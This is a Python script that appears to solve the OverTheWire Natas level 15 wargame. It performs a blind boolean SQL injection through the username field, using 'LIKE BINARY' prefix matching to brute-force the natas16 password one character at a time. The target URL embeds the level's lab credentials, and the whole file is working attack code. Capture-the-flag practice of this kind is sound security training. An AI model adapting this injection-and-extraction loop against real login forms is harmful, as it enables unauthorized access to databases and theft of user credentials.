#Brute forcing password for user 'natas16'
#using SQL injection
import requests;
dest = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php';

chars = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
attempt = '';
password = '';

for i in range (0, 32) :
	for i in range(0, len(chars)):
		attempt = password + chars[i];
		print 'Attempt: %s' % attempt;
		u = 'natas16" AND password LIKE BINARY "' +attempt+ '%';
		r = requests.post(dest,data={'username':u})
		if 'This user exists' in r.text :
			password = attempt;
			print 'SUCCESS! Password stands at %s' % password;
			break;
